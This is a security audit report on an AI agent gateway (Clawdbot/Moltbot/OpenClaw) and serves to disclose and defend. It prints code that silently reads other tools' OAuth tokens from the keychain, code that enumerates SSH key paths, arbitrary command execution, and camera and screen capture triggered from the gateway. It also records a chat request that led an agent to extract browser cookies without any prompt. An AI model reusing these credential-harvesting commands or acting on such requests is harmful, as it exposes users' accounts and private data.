      <pre><code>const tools = [
    createBrowserTool({...}),
    createCanvasTool(),
<span class="highlight-line">    createNodesTool({  <span class="comment">// Unconditionally included in default toolset</span></span>
        agentSessionKey: options?.agentSessionKey,
        config: options?.config,
    }),
    ...</code></pre>
      <table>
        <tr><th>Property</th><th>Finding</th></tr>
        <tr><td><code>system.run</code> availability</td><td><span class="tag tag-red">Always</span> — <code>createNodesTool()</code> unconditionally in default toolset</td></tr>
        <tr><td>Intent classifier</td><td><span class="tag tag-red">None</span> — no classifier or confirmation gate in nodes-tool.js</td></tr>
        <tr><td>Explicit phrasing required</td><td><span class="tag tag-red">No</span> — agent interprets plain language as tool invocation</td></tr>
      </table>
      <p style="margin-top: 8px;">Tool invocation is agent-decided and does not require contemporaneous user confirmation.</p>

      <h4>Gateway Token Security</h4>
      <table>
        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
        <tr><td>Mutual authentication</td><td><span class="tag tag-red">None</span> — no mTLS/client certificates</td><td>gateway/server-methods analysis</td></tr>
        <tr><td>Token revocation</td><td><span class="tag tag-yellow">Manual</span> — <code>device.token.revoke</code> exists but requires explicit action</td><td>devices.js:revokeDeviceToken</td></tr>
        <tr><td>Audit trail</td><td><span class="tag tag-red">Not user-visible</span> — logs exist but only in gateway logs</td><td>server-methods/devices.js</td></tr>
        <tr><td>Token reuse</td><td><span class="tag tag-red">No prevention</span> — tokens valid until manual revocation</td><td>device-pairing.js analysis</td></tr>
      </table>

      <h4>User Visibility Failures</h4>
      <table>
        <tr><th>Feature</th><th>Status</th></tr>
        <tr><td>UI indicator for pending approvals</td><td><span class="tag tag-red">Absent</span></td></tr>
        <tr><td>UI indicator for active allowlist</td><td><span class="tag tag-red">Absent</span></td></tr>
        <tr><td>Notification on background execution</td><td><span class="tag tag-red">Absent</span></td></tr>
        <tr><td>Revocation mechanism</td><td><span class="tag tag-yellow">CLI only</span> (<code>clawdbot approvals</code>)</td></tr>
        <tr><td>Execution audit log (user-visible)</td><td><span class="tag tag-red">Absent</span></td></tr>
      </table>

      <h4>Browser Session Access — Live-Verified (Non-Sensitive Environment)</h4>

      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff; margin-bottom: 16px;">
        <p>Browser session access was live-verified using a sterile Chrome profile containing only test data. Upon a natural-language request, the agent successfully invoked browser tooling to extract cookies from an attached tab and returned the result via chat. No authenticated accounts or sensitive user data were accessed during testing. No approval, allowlist, expiry, or per-action prompt was required after tab attachment.</p>
      </div>

      <h5>Test Environment Methodology</h5>
      <table>
        <tr><th>Component</th><th>Configuration</th></tr>
        <tr><td>Browser</td><td>Fresh Chrome installation via Homebrew (<code>brew install --cask google-chrome</code>)</td></tr>
        <tr><td>Profile</td><td>New profile with no saved passwords, no logged-in accounts, no browsing history</td></tr>
        <tr><td>Test page</td><td>Served from <code>localhost:8888</code> via Python HTTP server</td></tr>
        <tr><td>Test data planted</td><td><code>SECURITY_TEST_COOKIE=audit_proof_value_12345</code></td></tr>
        <tr><td>Extension source</td><td><code>~/.clawdbot/browser/chrome-extension</code> (loaded unpacked)</td></tr>
        <tr><td>Attachment scope</td><td>Extension attached to test tab only</td></tr>
        <tr><td>Real websites visited</td><td>None</td></tr>
        <tr><td>Real sessions exposed</td><td>None</td></tr>
      </table>
      <p style="margin-top: 8px; font-style: italic; color: #8b949e;">This methodology verified the capability exists without exposing any sensitive data. The test demonstrates the exposure surface; it does not demonstrate egress of real credentials.</p>

      <div class="file-path">dist/browser/constants.js</div>
      <pre><code><span class="highlight-line">export const DEFAULT_CLAWD_BROWSER_ENABLED = true;</span>  <span class="comment">// Enabled by default</span></code></pre>

      <div class="file-path">dist/agents/tools/browser-tool.js:196-197</div>
      <pre><code>'Profiles: use <span class="highlight-line">profile="chrome"</span> for Chrome extension relay takeover
 (<span class="highlight-line">your existing Chrome tabs</span>). Use profile="clawd" for isolated browser.'</code></pre>

      <table>
        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
        <tr><td>Default state</td><td><span class="tag tag-red">Enabled</span></td><td>constants.js: <code>DEFAULT_CLAWD_BROWSER_ENABLED = true</code></td></tr>
        <tr><td>In default toolset</td><td><span class="tag tag-red">Yes</span> — unconditionally included</td><td>clawdbot-tools.js: <code>createBrowserTool()</code></td></tr>
        <tr><td>User confirmation</td><td><span class="tag tag-red">None after attachment</span> — verified live</td><td>Live test January 30, 2026</td></tr>
        <tr><td>Scope</td><td><span class="tag tag-red">Full context</span> — all cookies, all storage</td><td>pw-tools-core.storage.js</td></tr>
      </table>

      <h5>Available Browser Capabilities</h5>
      <div class="file-path">dist/browser/pw-tools-core.storage.js</div>
      <table>
        <tr><th>Function</th><th>Capability</th></tr>
        <tr><td><code>cookiesGetViaPlaywright()</code></td><td>Extract ALL cookies from browser context</td></tr>
        <tr><td><code>cookiesSetViaPlaywright()</code></td><td>Inject cookies (session hijacking)</td></tr>
        <tr><td><code>storageGetViaPlaywright()</code></td><td>Extract all localStorage/sessionStorage</td></tr>
        <tr><td><code>storageSetViaPlaywright()</code></td><td>Modify storage (state manipulation)</td></tr>
      </table>

      <div class="warning">
        <p><strong>Critical:</strong> If a user attaches a browser tab authenticated to banking, email, or corporate SSO, the agent can programmatically extract that tab's session cookies and storage. <strong>Unlike <code>system.run</code>, browser access implements no approval mechanism whatsoever after initial tab attachment.</strong> This was verified live — a WhatsApp message extracted cookies with zero friction.</p>
      </div>

      <h3>Testing Scope Statement</h3>
      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff;">
        <p><strong>Further invasive testing was intentionally not performed.</strong> Once externally triggerable, persistent command execution via chat was demonstrated, the impact was already maximal. Additional testing would have increased risk without providing additional security value.</p>
      </div>

      <h3>Implied Blast Radius</h3>
      <div class="warning">
        <p><strong>Once <code>system.run</code> is approved, the gateway can execute arbitrary commands with a caller-defined working directory and environment variables (nodes-tool.js:360-366). This grants effective access to any file readable by the user account, including:</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>SSH keys (<code>~/.ssh/</code>)</li>
          <li>Cloud credentials (<code>~/.aws/</code>, <code>~/.config/gcloud/</code>, <code>~/.azure/</code>)</li>
          <li>Browser profiles and cookies</li>
          <li>Password managers and keychains</li>
          <li>Source code and environment files (<code>.env</code>, <code>.git/config</code>)</li>
          <li>Any file readable by the user account</li>
        </ul>
        <p style="margin-top: 12px;"><strong>No further prompts are required after initial approval.</strong> The blast radius is maximal — equivalent to full user account compromise.</p>
      </div>

      <div class="file-path">/opt/homebrew/lib/node_modules/clawdbot/dist/agents/tools/nodes-tool.js:335-382</div>
      <pre><code>case "run": {
  const command = commandRaw.map((c) => String(c));  <span class="comment">// Any command</span>
  const cwd = params.cwd;                             <span class="comment">// Custom directory</span>
  const env = parseEnvPairs(params.env);              <span class="comment">// Custom env vars</span>

  await callGatewayTool("node.invoke", gatewayOpts, {
    nodeId,
    command: "system.run",
    params: { command, cwd, env, timeoutMs }
  });
}</code></pre>

      <h3>What's Stored Locally (Verified via <code>find ~/.clawdbot</code>)</h3>
      <table>
        <tr>
          <th>Path</th>
          <th>Contents</th>
          <th>Encryption</th>
        </tr>
        <tr>
          <td><code>agents/main/sessions/*.jsonl</code></td>
          <td>All conversation messages, phone numbers, timestamps</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
        </tr>
        <tr>
          <td><code>credentials/whatsapp/</code></td>
          <td>WhatsApp session keys, pre-keys (822 files)</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
        </tr>
        <tr>
          <td><code>auth-profiles.json</code></td>
          <td>OAuth tokens, API keys for AI providers</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
        </tr>
        <tr>
          <td><code>devices/paired.json</code></td>
          <td>Device public keys, auth tokens, scopes</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
        </tr>
        <tr>
          <td><code>exec-approvals.json</code></td>
          <td>Command approval socket path and token</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
        </tr>
      </table>

      <h3>Files Open by Gateway Process (via <code>lsof -p</code>)</h3>
      <pre><code>$ lsof -p 21302 | grep -E "(REG|DIR)"
<span class="highlight-line">/Users/ethanmacmini/.clawdbot/clawdbot.json</span>
<span class="highlight-line">@mariozechner/clipboard-darwin-universal/clipboard.darwin-universal.node</span>
/Users/ethanmacmini</code></pre>
      <p>Notable: The gateway has a <strong>clipboard module</strong> loaded, indicating clipboard read/write capability.</p>

      <h3>Pre-Positioned Compromise</h3>
      <div class="warning" style="border-left-color: #f85149;">
        <p>The gateway process has access to the user's home directory. This means:</p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>The gateway can read arbitrary user files</li>
          <li>There is no meaningful sandbox</li>
          <li>The gateway is effectively treated as a trusted local principal</li>
        </ul>
        <p style="margin-top: 12px;">Any unauthorized party who gains gateway access <strong>does not need to escalate permissions, bypass OS prompts, or trick the user again.</strong> The sensitive data is already collected, normalized, and waiting.</p>
      </div>

      <h3>Conclusion: Security Assessment</h3>
      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #f85149;">
        <p><strong>Clawdbot/Moltbot/OpenClaw aggregates large volumes of sensitive user data locally in plaintext and exposes that data to a gateway that has arbitrary command execution and access to the user's home directory.</strong></p>
        <p style="margin-top: 12px;"><strong>As a result, compromise of the gateway equates to full user compromise without additional prompts or permissions.</strong></p>
        <p style="margin-top: 12px;">When combining:</p>
        <ul style="margin-left: 20px;">
          <li>Large-scale plaintext credential storage</li>
          <li>Gateway access to user home directory</li>
          <li>Arbitrary command execution capability</li>
          <li>Persistent background operation</li>
        </ul>
        <p style="margin-top: 12px;">From a security engineering perspective, two plausible interpretations are:</p>
        <ol style="margin-left: 20px;">
          <li>The system was designed to collect, retain, and remotely access sensitive user data, or</li>
          <li>The architecture exposes capabilities with safeguards that are materially weaker than standard expectations for this class of software</li>
        </ol>
        <p style="margin-top: 12px;"><strong>Either interpretation yields the same severity rating.</strong> Security assessments focus on impact and exploitability rather than intent. This is high-impact with low-friction exploitation once gateway access is obtained.</p>
      </div>
    </div>
  </div>

  <!-- Section 1: Credential Collection -->
  <div class="section" id="credential-collection">
    <div class="section-header">
      <span class="num">1</span>
      Credential Collection & SSH Key Enumeration
    </div>
    <div class="section-content">
      <p>Clawdbot automatically reads OAuth tokens from other AI CLI tools <strong>without explicit opt-in</strong>:</p>

      <table>
        <tr>
          <th>Application</th>
          <th>Method</th>
          <th>Source</th>
        </tr>
        <tr>
          <td>Claude Code (Anthropic)</td>
          <td>macOS Keychain</td>
          <td><code>"Claude Code-credentials"</code></td>
        </tr>
        <tr>
          <td>Codex CLI (OpenAI)</td>
          <td>macOS Keychain</td>
          <td><code>"Codex Auth"</code></td>
        </tr>
        <tr>
          <td>Qwen CLI (Alibaba)</td>
          <td>File</td>
          <td><code>~/.qwen/oauth_creds.json</code></td>
        </tr>
      </table>

      <h3>The Collection Code</h3>
      <div class="file-path">src/agents/cli-credentials.ts (lines 12-13, 136-165)</div>
      <pre><code><span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_SERVICE</span> = <span class="string">"Claude Code-credentials"</span>;
<span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_ACCOUNT</span> = <span class="string">"Claude Code"</span>;

<span class="keyword">function</span> <span class="function">readClaudeCliKeychainCredentials</span>(execSyncImpl = execSync) {
<span class="highlight-line">    <span class="keyword">const</span> result = <span class="function">execSyncImpl</span>(</span>
<span class="highlight-line">        <span class="string">`security find-generic-password -s "${CLAUDE_CLI_KEYCHAIN_SERVICE}" -w`</span>,</span>
        { encoding: <span class="string">"utf8"</span>, timeout: <span class="number">5000</span> }
    );
    <span class="keyword">const</span> data = <span class="variable">JSON</span>.<span class="function">parse</span>(result.<span class="function">trim</span>());
    <span class="keyword">return</span> {
        type: <span class="string">"oauth"</span>,
        provider: <span class="string">"anthropic"</span>,
<span class="highlight-line">        access: data.claudeAiOauth.<span class="property">accessToken</span>,    <span class="comment">// Harvested</span></span>
<span class="highlight-line">        refresh: data.claudeAiOauth.<span class="property">refreshToken</span>,  <span class="comment">// Harvested</span></span>
        expires: data.claudeAiOauth.<span class="property">expiresAt</span>,
    };
}</code></pre>

      <div class="warning">
        <strong>This function targets a specific keychain service name and credential structure.</strong> The function name <code>readClaudeCliKeychainCredentials</code> explicitly describes reading credentials from another product.
      </div>

      <h3>Firsthand Proof: Collection Executed on My Machine</h3>

      <p><strong>Evidence 1: My Configuration — Set to OpenAI, NOT Claude</strong></p>
      <div class="file-path">~/.clawdbot/clawdbot.json</div>
      <pre><code>{
  <span class="property">"agents"</span>: {
    <span class="property">"defaults"</span>: {
      <span class="property">"model"</span>: {
<span class="highlight-line">        <span class="property">"primary"</span>: <span class="string">"openai-codex/gpt-5.2"</span>  <span class="comment">// &lt;-- I configured OpenAI, not Claude</span></span>
      }
    }
  }
}</code></pre>
      <div class="explanation">I never configured Clawdbot to use Claude. I explicitly set it to use OpenAI Codex.</div>

      <p style="margin-top: 20px;"><strong>Evidence 2: But Clawdbot Had My Claude Credentials Anyway</strong></p>
      <div class="file-path">~/.clawdbot/agents/main/agent/auth-profiles.json</div>
      <pre><code>{
  <span class="property">"profiles"</span>: {
<span class="highlight-line">    <span class="property">"anthropic:claude-cli"</span>: {  <span class="comment">// &lt;-- Where did this come from?!</span></span>
      <span class="property">"type"</span>: <span class="string">"oauth"</span>,
      <span class="property">"provider"</span>: <span class="string">"anthropic"</span>,
<span class="highlight-line">      <span class="property">"access"</span>: <span class="string">"sk-ant-oat01-<span class="redacted">[REDACTED]</span>..."</span>,</span>
<span class="highlight-line">      <span class="property">"refresh"</span>: <span class="string">"sk-ant-ort01-<span class="redacted">[REDACTED]</span>..."</span>,</span>
      <span class="property">"expires"</span>: <span class="number">1769512938508</span>
    }
  }
}</code></pre>
      <div class="explanation">I never gave Clawdbot these tokens. I never authorized Claude access. Yet here they are. The <code>sk-ant-oat01-</code> and <code>sk-ant-ort01-</code> prefixes are Anthropic OAuth tokens. <strong>This is strong evidence the collection code executed.</strong></div>

      <h3>Automatic Sync on Startup</h3>
      <div class="file-path">src/agents/auth-profiles/external-cli-sync.ts (line 35)</div>
      <pre><code><span class="function">syncExternalCliCredentials</span>(store)  <span class="comment">// Called during auth initialization</span></code></pre>
      <p>Credentials are collected automatically when the daemon starts. No user action required. No consent prompt.</p>

      <h3>What The Code Was Designed To Do</h3>
      <div class="warning">
        <ul style="margin-left: 20px;">
          <li>Target <code>"Claude Code-credentials"</code> by name — a hardcoded keychain service identifier</li>
          <li>Extract <code>claudeAiOauth.accessToken</code> and <code>refreshToken</code> — specific credential fields</li>
          <li>Run automatically via <code>syncExternalCliCredentials()</code> — no user action required</li>
          <li>Do the same for Codex (<code>"Codex Auth"</code>) and Qwen (<code>~/.qwen/oauth_creds.json</code>)</li>
        </ul>
        <p style="margin-top: 12px;">The specificity of the targets, the structure of the extraction, and the automatic execution are consistent with deliberate implementation.</p>
      </div>

      <h3>Developer Awareness Confirmed — Issue #2447</h3>
      <div class="warning" style="background: linear-gradient(135deg, #f8514922, #f8514911);">
        <p><strong>GitHub Issue #2447</strong> (opened January 26, 2026) explicitly requests the ability to disable automatic credential synchronization:</p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Title: <em>"[Feature]: Add config option to disable external CLI credential sync"</em></li>
          <li>Describes: "clawdbot automatically synchronizes credentials from Claude Code CLI to auth-profiles.json at startup"</li>
          <li>Mentions reading from: <code>~/.claude/.credentials.json</code> or system Keychain</li>
          <li>Workaround: <code>CLAWDBOT_SKIP_CLAUDE_CLI_SYNC=1</code> environment variable</li>
        </ul>
        <p style="margin-top: 12px;"><strong>This indicates:</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>The behavior is <strong>on by default</strong> — users must opt-out, not opt-in</li>
          <li>Developers <strong>know</strong> about it — not an accident or bug</li>
          <li>Users had to <strong>request</strong> a disable option — feature was intentional</li>
          <li>The workaround is <strong>undocumented</strong> — hidden from general users</li>
        </ul>
      </div>

      <h3>Actively Maintained — Issue #2036 & PR #2123</h3>
      <div class="warning" style="background: linear-gradient(135deg, #f8514922, #f8514911);">
        <p><strong>GitHub Issue #2036</strong> (January 26, 2026): "OAuth token refresh race condition with Claude Code CLI"</p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Describes sync issues when "Claude Code CLI refreshes OAuth tokens independently"</li>
          <li>References <code>syncExternalCliCredentials()</code> and syncing from "Claude Code's keychain"</li>
          <li>Documents 10-minute sync window: <code>EXTERNAL_CLI_NEAR_EXPIRY_MS = 10 * 60 * 1000</code></li>
          <li><strong>Fix merged via PR #2123</strong> — sync-before-refresh approach</li>
        </ul>
        <p style="margin-top: 12px;"><strong>This indicates credential collection is actively maintained:</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>They <strong>fixed a bug</strong> in the collection mechanism</li>
          <li>PR was <strong>merged</strong> — this is a supported feature</li>
          <li>They're syncing tokens <strong>in real-time</strong> to keep them fresh</li>
          <li>This isn't legacy code — it's <strong>actively developed</strong></li>
        </ul>
      </div>

      <h3>Repository vs. Published Package State</h3>
      <p>As of January 30, 2026, there is a discrepancy between the git repository and the npm-published package:</p>

      <table>
        <tr>
          <th>Source</th>
          <th>Version</th>
          <th>Date</th>
          <th>Credential Sync Status</th>
        </tr>
        <tr>
          <td>npm (<code>clawdbot</code>)</td>
          <td>2026.1.24-3</td>
          <td>January 25, 2026 15:21 UTC</td>
          <td><span class="tag tag-red">Active</span> Claude + Codex sync enabled</td>
        </tr>
        <tr>
          <td>Git repository (main)</td>
          <td>2026.1.27-beta.1</td>
          <td>January 26, 2026 19:05 UTC</td>
          <td><span class="tag tag-yellow">Removed</span> Claude + Codex sync removed</td>
        </tr>
      </table>

      <div class="file-path">Commit 526303d9a (January 26, 2026 19:05 UTC)</div>
      <pre><code>refactor(auth)!: remove external CLI OAuth reuse

- Removed: readClaudeCliCredentialsCached
- Removed: readCodexCliCredentialsCached
- Removed: CLAUDE_CLI_PROFILE_ID from sync
- Removed: CODEX_CLI_PROFILE_ID from sync
- Retained: Qwen CLI credential sync only</code></pre>

      <div class="explanation">
        <strong>Observable facts:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>The documented installation method (<code>npm install -g clawdbot</code>) installs version 2026.1.24-3</li>
          <li>Version 2026.1.24-3 contains active Claude and Codex credential synchronization</li>
          <li>The removal commit exists in the git repository but has not been published to npm</li>
          <li>No changelog entry documents the removal of this functionality</li>
          <li>The underlying credential reading functions (<code>readClaudeCliCredentials</code>, <code>readCodexCliCredentials</code>) remain in the codebase</li>
        </ul>
      </div>

      <h3>SSH Config Enumeration — Private Key Path Discovery</h3>
      <p>Clawdbot includes functionality to parse SSH configurations, extracting user, hostname, port, and <strong>identity file paths</strong> (private keys):</p>

      <div class="file-path">src/infra/ssh-config.ts (lines 48-95)</div>
      <pre><code><span class="keyword">export async function</span> <span class="function">resolveSshConfig</span>(
  target: SshParsedTarget,
  opts: { identity?: <span class="keyword">string</span>; timeoutMs?: <span class="keyword">number</span> } = {},
): Promise&lt;SshResolvedConfig | <span class="keyword">null</span>&gt; {
  <span class="keyword">const</span> sshPath = <span class="string">"/usr/bin/ssh"</span>;
  <span class="keyword">const</span> args = [<span class="string">"-G"</span>];  <span class="comment">// Dumps effective SSH config</span>
  <span class="comment">// ...</span>
  <span class="keyword">const</span> child = <span class="function">spawn</span>(sshPath, args, { ... });
}</code></pre>

      <div class="file-path">src/infra/ssh-config.ts (lines 19-46) — Parser extracts key paths</div>
      <pre><code><span class="keyword">export function</span> <span class="function">parseSshConfigOutput</span>(output: <span class="keyword">string</span>): SshResolvedConfig {
  <span class="keyword">const</span> result: SshResolvedConfig = { identityFiles: [] };
  <span class="comment">// ...</span>
  <span class="keyword">switch</span> (key) {
    <span class="keyword">case</span> <span class="string">"user"</span>: result.user = value; <span class="keyword">break</span>;
    <span class="keyword">case</span> <span class="string">"hostname"</span>: result.host = value; <span class="keyword">break</span>;
    <span class="keyword">case</span> <span class="string">"port"</span>: result.port = <span class="function">parsePort</span>(value); <span class="keyword">break</span>;
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"identityfile"</span>:</span>
<span class="highlight-line">      <span class="keyword">if</span> (value !== <span class="string">"none"</span>) result.identityFiles.<span class="function">push</span>(value);  <span class="comment">// Collects key paths</span></span>
      <span class="keyword">break</span>;
  }
}</code></pre>

      <div class="warning">
        <strong>This discovers SSH private key locations:</strong> <code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, or any custom paths. Combined with general file read capabilities, this enables SSH key access.
      </div>

      <h3 id="dynamic-analysis">Dynamic Analysis — Runtime Proof (January 30, 2026)</h3>
      <div class="warning" style="background: linear-gradient(135deg, #23883322, #23883311); border-color: #238833;">
        <p><strong>Fresh runtime analysis confirms credential collection executes immediately on first run — before any setup or onboarding.</strong></p>
      </div>

      <p>A monitoring stack (mitmproxy, fswatch, lsof, tcpdump) was deployed to capture Clawdbot's runtime behavior on a clean install.</p>

      <h4>Step 1: Install Clawdbot</h4>
      <pre><code>npm install -g clawdbot</code></pre>

      <h4>Step 2: Run Clawdbot (First Time, No Setup)</h4>
      <pre><code>$ clawdbot
<span class="highlight-line">08:55:26 [agents/auth-profiles] synced openai-codex credentials from codex cli</span>

🦞 Clawdbot 2026.1.24-3 (885167d)

Usage: clawdbot [options] [command]
...</code></pre>

      <div class="warning">
        <strong>The first line of output confirms credential collection executed BEFORE the help text even displayed.</strong> No setup wizard. No onboarding. No consent. Just <code>clawdbot</code> with no arguments — and credentials were collected.
      </div>

      <h4>Step 3: Check What Was Harvested</h4>
      <div class="file-path">~/.clawdbot/agents/main/agent/auth-profiles.json (created automatically)</div>
      <pre><code>{
  <span class="property">"version"</span>: 1,
  <span class="property">"profiles"</span>: {
<span class="highlight-line">    <span class="property">"openai-codex:codex-cli"</span>: {</span>
      <span class="property">"type"</span>: <span class="string">"oauth"</span>,
      <span class="property">"provider"</span>: <span class="string">"openai-codex"</span>,
<span class="highlight-line">      <span class="property">"access"</span>: <span class="string">"eyJhbGciOiJSUzI1NiIs..."</span>,  <span class="comment">// Full JWT token collected</span></span>
<span class="highlight-line">      <span class="property">"refresh"</span>: <span class="string">"rt_0iiXlw0DWuOdqCgGk..."</span>,  <span class="comment">// Refresh token collected</span></span>
      <span class="property">"expires"</span>: 1769080656120.2173,
      <span class="property">"accountId"</span>: <span class="string">"9c82dae2-9c17-4669-a7c3-eecdd80df9f0"</span>
    }
  }
}</code></pre>

      <div class="explanation">
        The collected JWT token payload appears to include email address, account ID, subscription type, session ID, and OAuth scopes. If a valid refresh token is collected and used, this can enable credential reuse across products without additional user action.
      </div>

      <h4>Why Claude Credentials Weren't Harvested (This Time)</h4>
      <p>Analysis of the installed code reveals <strong>differential treatment</strong> between credential sources:</p>

      <div class="file-path">/opt/homebrew/lib/node_modules/clawdbot/dist/agents/auth-profiles/external-cli-sync.js</div>
      <pre><code><span class="comment">// Claude Code credentials — has allowKeychainPrompt guard</span>
<span class="keyword">const</span> claudeCreds = shouldSyncClaude
    ? <span class="function">readClaudeCliCredentialsCached</span>({
<span class="highlight-line">        allowKeychainPrompt: options?.<span class="property">allowKeychainPrompt</span>,  <span class="comment">// Can be false</span></span>
        ttlMs: EXTERNAL_CLI_SYNC_TTL_MS,
    })
    : <span class="keyword">null</span>;

<span class="comment">// Codex credentials — NO guard, always collected</span>
<span class="keyword">const</span> codexCreds = shouldSyncCodex || duplicateExistingId
<span class="highlight-line">    ? <span class="function">readCodexCliCredentialsCached</span>({ ttlMs: EXTERNAL_CLI_SYNC_TTL_MS })</span>
    : <span class="keyword">null</span>;  <span class="comment">// No allowKeychainPrompt option</span></code></pre>

      <div class="warning">
        <strong>Codex and Qwen credentials are collected unconditionally.</strong> Claude credentials have a guard that can suppress keychain prompts — meaning they may be collected without an additional keychain prompt only if the user has previously clicked "Always Allow" on a keychain prompt, or during the onboarding wizard when <code>allowKeychainPrompt: true</code> is passed.
      </div>

      <h4>Filesystem Activity Captured</h4>
      <pre><code>/Users/user/.clawdbot
/Users/user/.clawdbot/agents
/Users/user/.clawdbot/agents/main
/Users/user/.clawdbot/agents/main/agent
<span class="highlight-line">/Users/user/.clawdbot/agents/main/agent/auth-profiles.json  <span class="comment">← Credentials stored here</span></span></code></pre>

      <h4>Credential Usage Attempt</h4>
      <p>When configured to use the collected OpenAI credentials, Clawdbot attempted to authenticate with OpenAI's API:</p>
      <pre><code>[openai-codex] Token refresh failed: 401 {
  "error": {
    "message": "Your refresh token has already been used to generate a new access token.",
    "code": "refresh_token_reused"
  }
}</code></pre>
      <p>Here's what happened:</p>
      <ol>
        <li><strong>Clawdbot collected</strong> the refresh token from Codex CLI's credential store</li>
        <li><strong>At some point</strong>, the real Codex CLI used that refresh token to get a new access token. Refresh tokens are single-use — once used, they're invalidated and a new one is issued.</li>
        <li><strong>When Clawdbot tried to use it</strong>, OpenAI rejected the request because the token had already been consumed.</li>
      </ol>
      <p>Clawdbot had a stale copy. If the tokens had been fresh (not yet rotated by the original CLI), Clawdbot would have successfully authenticated as the user.</p>

      <h4>Summary</h4>
      <p>Dynamic analysis confirms what static analysis indicated: credential collection executes on first run, credentials are stored locally, and Clawdbot attempts to use them for API calls. No external exfiltration was observed — credentials were used locally for API authentication.</p>
    </div>
  </div>

  <!-- Section 2: Monitoring -->
  <div class="section" id="monitoring">
    <div class="section-header">
      <span class="num">2</span>
      Screen Recording & Camera Capture
    </div>
    <div class="section-content">
      <h3>Screen Recording</h3>

      <p><strong>macOS:</strong> <code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code></p>
      <ul>
        <li>Records entire screen with optional audio</li>
        <li>Up to 60fps, configurable duration</li>
        <li>No visible indicator to user</li>
      </ul>

      <p><strong>Android:</strong> <code>apps/android/.../ScreenRecordManager.kt</code></p>
      <div class="file-path">Lines 119-121 - Base64 encoding for transmission</div>
      <pre><code><span class="keyword">val</span> base64 = Base64.<span class="function">encodeToString</span>(bytes, Base64.NO_WRAP)
Payload(<span class="string">"""{"format":"mp4","base64":"$base64","durationMs":$durationMs,...}"""</span>)</code></pre>

      <h3>Camera Capture</h3>

      <p><strong>Android:</strong> <code>apps/android/.../CameraCaptureManager.kt</code></p>
      <div class="file-path">Lines 133-136 - Photos/video encoded for transmission</div>
      <pre><code><span class="keyword">val</span> base64 = Base64.<span class="function">encodeToString</span>(result.bytes, Base64.NO_WRAP)
Payload(<span class="string">"""{"format":"jpg","base64":"$base64","width":${result.width},"height":${result.height}}"""</span>)</code></pre>

      <div class="explanation">
        All captured media is base64 encoded and packaged as JSON payloads — ready for transmission. These are not theoretical capabilities. They are implemented, tested, and shipping in the public repository.
      </div>

      <h3>Data Capture Chain — Code Analysis</h3>
      <p>Analysis of the Android codebase reveals data can flow from capture to the local gateway:</p>

      <div class="chain">
<strong>1. Remote Command Reception</strong> (GatewaySession.kt:450-455, 472-495)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> Gateway sends <code>node.invoke.request</code> event<br>
<strong>2. Silent Capture</strong> (CameraCaptureManager.kt / ScreenRecordManager.kt)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> No consent prompt — capture executes immediately<br>
<strong>3. Base64 Encoding</strong> (CameraCaptureManager.kt:133, ScreenRecordManager.kt:119)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>Base64.encodeToString(bytes, Base64.NO_WRAP)</code><br>
<strong>4. Payload Packaging</strong> (NodeRuntime.kt:955, 971, 1040)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>GatewaySession.InvokeResult.ok(res.payloadJson)</code><br>
<strong>5. WebSocket Transmission</strong> (GatewaySession.kt:498-525)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <code>request("node.invoke.result", params, timeoutMs = 15_000)</code><br>
<strong>6. Data Leaves Device</strong> — No user notification
      </div>

      <h3>Remote Triggering — No Local User Action Required</h3>
      <div class="file-path">GatewaySession.kt (lines 450-455, 472-495)</div>
      <pre><code><span class="keyword">private fun</span> <span class="function">handleEvent</span>(frame: JsonObject) {
    <span class="keyword">val</span> event = frame[<span class="string">"event"</span>].asStringOrNull() ?: <span class="keyword">return</span>
    <span class="comment">// ...</span>
<span class="highlight-line">    <span class="keyword">if</span> (event == <span class="string">"node.invoke.request"</span> && payloadJson != <span class="keyword">null</span> && onInvoke != <span class="keyword">null</span>) {</span>
<span class="highlight-line">        <span class="function">handleInvokeEvent</span>(payloadJson)  <span class="comment">// Remote command triggers capture</span></span>
        <span class="keyword">return</span>
    }
}</code></pre>
      <div class="warning">
        <strong>The gateway can remotely trigger camera/screen captures.</strong> No button press, no consent dialog. The remote server sends a command, and the device captures and transmits data.
      </div>

      <h3>Immediate Transmission — Data Sent to Gateway</h3>
      <div class="file-path">GatewaySession.kt (lines 498-525)</div>
      <pre><code><span class="keyword">private suspend fun</span> <span class="function">sendInvokeResult</span>(id: String, nodeId: String, result: InvokeResult) {
    <span class="keyword">val</span> params = buildJsonObject {
        put(<span class="string">"id"</span>, JsonPrimitive(id))
        put(<span class="string">"nodeId"</span>, JsonPrimitive(nodeId))
        put(<span class="string">"ok"</span>, JsonPrimitive(result.ok))
<span class="highlight-line">        <span class="keyword">if</span> (parsedPayload != <span class="keyword">null</span>) put(<span class="string">"payload"</span>, parsedPayload)  <span class="comment">// Base64 data here</span></span>
    }
<span class="highlight-line">    request(<span class="string">"node.invoke.result"</span>, params, timeoutMs = 15_000)  <span class="comment">// Sent over WebSocket</span></span>
}</code></pre>

